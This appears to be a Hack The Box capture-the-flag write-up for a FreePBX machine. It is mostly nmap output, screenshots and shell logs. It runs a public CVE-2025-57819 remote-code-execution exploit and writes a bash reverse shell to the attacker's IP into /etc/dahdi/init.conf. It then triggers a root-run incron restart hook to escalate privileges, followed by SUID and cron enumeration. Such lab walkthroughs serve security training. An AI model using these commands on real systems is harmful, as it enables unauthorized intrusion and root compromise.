

<img width="1602" height="303" alt="image" src="https://github.com/user-attachments/assets/fc38acd3-7fff-40fc-9398-8a83627d7a84" />




```
nmap -sCV 10.129.245.100                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-30 10:57 -0400
Nmap scan report for 10.129.245.100
Host is up (0.21s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27


```


<img width="1918" height="815" alt="image" src="https://github.com/user-attachments/assets/4c450770-31e8-4496-8dc3-ac925d06f522" />



```
https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE
```

```
python3 exploit.py --rhost connected.htb --lhost 10.10.14.60 --lport 5555
```



<img width="1054" height="712" alt="image" src="https://github.com/user-attachments/assets/ca02821c-5fd8-4800-87d4-7eaa66696bf8" />


<img width="1221" height="778" alt="image" src="https://github.com/user-attachments/assets/3ef55bfd-0eb1-4985-9b5f-cd25cb498395" />



<img width="1260" height="771" alt="image" src="https://github.com/user-attachments/assets/6f5ad0b3-cd1e-49ae-86f4-278a39a5fde4" />




echo 'bash -c "bash -i >& /dev/tcp/10.10.14.60/4445 0>&1" &' >> /etc/dahdi/init.conf

```
[asterisk@connected ~]$ cat /etc/dahdi/init.conf
#
# Shell settings for Dahdi initialization scripts.
# This replaces the old/per-platform files (/etc/sysconfig/zaptel,
# /etc/defaults/zaptel)
#

# The maximal timeout (seconds) to wait for udevd to finish generating 
# device nodes after the modules have loaded and before running dahdi_cfg. 
#DAHDI_DEV_TIMEOUT=40

# A list of modules to unload when stopping.
# All of their dependencies will be unloaded as well.
#DAHDI_UNLOAD_MODULES=""                # Disable module unloading
#DAHDI_UNLOAD_MODULES="dahdi echo"      # If you use OSLEC

# Override settings for xpp_fxloader
#XPP_FIRMWARE_DIR=/usr/share/dahdi
#XPP_HOTPLUG_DISABLED=yes
#XPP_HOTPLUG_DAHDI=yes
#ASTERISK_SUPPORTS_DAHDI_HOTPLUG=yes

# Disable udev handling:
#DAHDI_UDEV_DISABLE_DEVICES=yes
#DAHDI_UDEV_DISABLE_SPANS=yes
[asterisk@connected ~]$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.60/4445 0>&1" &' >> /etc/dahdi/init.conf
[asterisk@connected ~]$ echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
[asterisk@connected ~]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[asterisk@connected ~]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[asterisk@connected ~]$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.60/4445 0>&1" &' >> /etc/dahdi/init.conf
[asterisk@connected ~]$ echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
[asterisk@connected ~]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[asterisk@connected ~]$ 

```

<img width="1241" height="766" alt="image" src="https://github.com/user-attachments/assets/d10a14a1-0c52-4f8e-963b-3e4b3d4b84a0" />


<img width="1204" height="660" alt="image" src="https://github.com/user-attachments/assets/d89291b5-bd1f-464d-80c5-4b53ec6f6d45" />



<img width="1064" height="616" alt="image" src="https://github.com/user-attachments/assets/893fe318-b49a-45fc-a0bc-c0dc6f38a9d2" />



```
ssh -i ~/.ssh/id_rsa asterisk@connected.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /                                                                                                               
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                                                                                                
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \                                                                                                                
| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                                                                                               
\_|    |_|    \___| \___|\_|    \____/ \/   \/                                                                                                               
                                                                                                                                                             
                                                                                                                                                             
NOTICE! You have 3 notifications! Please log into the UI to see them!                                                                                        
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | 00:50:56:95:F0:41 | 10.129.245.100            |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected ~]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[asterisk@connected ~]$ find / -perm -4000 -ls 2>/dev/null
13259593   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
13259758   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
13389041  144 ---s--x--x   1 root     root       147336 Jan 26  2021 /usr/bin/sudo
13495378   24 -rws--x--x   1 root     root        23968 Apr  1  2020 /usr/bin/chfn
13495381   24 -rws--x--x   1 root     root        23880 Apr  1  2020 /usr/bin/chsh
13497270   44 -rwsr-xr-x   1 root     root        44264 Apr  1  2020 /usr/bin/mount
13463079   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
13463080   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
13463083   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
13497285   32 -rwsr-xr-x   1 root     root        32128 Apr  1  2020 /usr/bin/su
13497289   32 -rwsr-xr-x   1 root     root        31984 Apr  1  2020 /usr/bin/umount
13510087   28 -rwsr-xr-x   1 root     root        27672 Jan 25  2022 /usr/bin/pkexec
13510110   60 -rwsr-xr-x   1 root     root        57656 Aug  8  2019 /usr/bin/crontab
13823273  100 -rwsr-xr-x   1 root     root        99528 Sep  3  2020 /usr/bin/incrontab
13823289   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
15587075  208 ---s--x---   1 root     stapusr    212080 Apr  1  2020 /usr/bin/staprun
145444   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
145446   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
1418914   12 -rwsr-xr-x   1 root     root        11296 Apr  1  2020 /usr/sbin/usernetctl
1805856   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
4722099   16 -rwsr-xr-x   1 root     root        15432 Jan 25  2022 /usr/lib/polkit-1/polkit-agent-helper-1
9028054   60 -rwsr-x---   1 root     dbus        57936 Jul 13  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
9221964   16 -rwsr-sr-x   1 abrt     abrt        15344 Apr  2  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
[asterisk@connected ~]$ cat /etc/cron.d/*
# Run the hourly jobs
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
01 * * * * root run-parts /etc/cron.hourly
# This runs the update check every night at midnight. It sleeps for up to an hour
# as a random delay.
#
# This file was installed by the 'sangoma-pbx' package.
#
0 0 * * * root [ -e /etc/profile.d/z001-updates.sh ] && /etc/profile.d/z001-updates.sh update
# Run system wide raid-check once a week on Sunday at 1am by default
0 1 * * Sun root /usr/sbin/raid-check

cat: /etc/cron.d/sysstat: Permission denied
[asterisk@connected ~]$ cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
[asterisk@connected ~]$ ps aux | grep incron
root        795  0.0  0.0  15044  2840 ?        Ss   14:59   0:00 /usr/sbin/incrond
asterisk   7137  0.0  0.0 112820  2328 pts/0    S+   16:21   0:00 grep --color=auto incron
[asterisk@connected ~]$ ls -la /usr/bin/sysadmin_manager
-rwxr-xr-x. 1 root root 6403 Apr 15  2021 /usr/bin/sysadmin_manager
[asterisk@connected ~]$ head -50 /usr/bin/sysadmin_manager
#!/usr/bin/php
<?php
namespace Sysadmin;

// 
// Secure Sysadmin Hook Service
// Copyright 2018 Sangoma Technologies
//

//////////////////////////////////////////////////////////////////
// This file is DELIBERATELY left un-encoded to assist security //
// researchers, and to allow people to add their own keys if    //
// required. If you have questions or comments, please email    //
// them to security@freepbx.org or on #freepbx on Freenode.     //
//////////////////////////////////////////////////////////////////

//
// This is NOT FREE SOFTWARE. You are NOT PERMITTED to modify
// or redistribute this code. All rights are reserved.
//

openlog("sysadmin-hook", LOG_PID | LOG_PERROR, LOG_CRON);

// Verify that our 'includes' file is correct
if (!file_exists("/usr/lib/sysadmin/includes.php")) {
        $err = "Unable to open /usr/lib/sysadmin/includes.php";
        syslog(LOG_ERR, $err);
        print "$err\n";
        exit;
}

// This hash is automatically updated when the RPM is built. If
// this is not matching, reinstall the RPM.
$includeshash = "4b04888e0c323dacc57836beb1d5e1890a00eafd431b3288519fb8644aedd358";

$hashalgo = "sha256";

if (hash_file($hashalgo, "/usr/lib/sysadmin/includes.php") !== $includeshash) {
        $err = "File /usr/lib/sysadmin/includes.php has been tampered. Reinstall sysadmin RPM.";
        syslog(LOG_ERR, $err);
        print "$err\n";
        exit;
}

require '/usr/lib/sysadmin/includes.php';

// These are the keys that are allowed to run root hooks.
$whitelist = array(
        "9F9169F4B33B4659" => "FreePBX Master Key",
        "86CE877469D2EAD9" => "Signing Server 1 (2014-2020)",
[asterisk@connected ~]$ ls -la /usr/lib/sysadmin/
total 100
drwxr-xr-x.  2 root root   178 Nov 30  2025 .
dr-xr-xr-x. 43 root root  4096 Nov 30  2025 ..
-rwxr-xr-x.  1 root root 56961 Apr 15  2021 includes.php
-rwxr-xr-x.  1 root root  3770 Apr 15  2021 IoncubeLicenseLoader.php
-rwxr-xr-x.  1 root root  7802 Apr 15  2021 Ioncube.php
-rwxr-xr-x.  1 root root  2984 Apr 15  2021 licensed.php
-rwxr-xr-x.  1 root root  5521 Apr 15  2021 license_loader.php
-rwxr-xr-x.  1 root root 10015 Apr 15  2021 Schmooze.class.php
-rwxr-xr-x.  1 root root  3170 Apr 15  2021 ZendLicenseLoader.php
[asterisk@connected ~]$ ls -la /var/www/html/admin/modules/

```


<img width="703" height="816" alt="image" src="https://github.com/user-attachments/assets/18f01fd8-178e-458f-8849-c7cf065df751" />

